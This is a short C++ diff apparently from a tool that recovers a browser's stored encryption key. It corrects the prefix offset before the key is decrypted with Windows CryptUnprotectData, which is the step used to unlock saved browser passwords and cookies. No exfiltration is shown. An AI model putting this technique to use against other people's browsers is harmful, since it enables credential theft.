@@ -57,7 +57,7 @@ net::expected<std::vector<BYTE>> get_encryption_key(const fs::path& browser_path
         encryption_key64.data(),
         encryption_key64.size());
 
-    DATA_BLOB DataIn = { (DWORD)encryption_key.size() - 4, (BYTE*)encryption_key.data() + 4};
+    DATA_BLOB DataIn = { (DWORD)encryption_key.size() - 5, (BYTE*)encryption_key.data() + 5};
     DATA_BLOB DataOut = {0};
     LPWSTR pDescrOut = nullptr;
     if(!CryptUnprotectData(&DataIn,
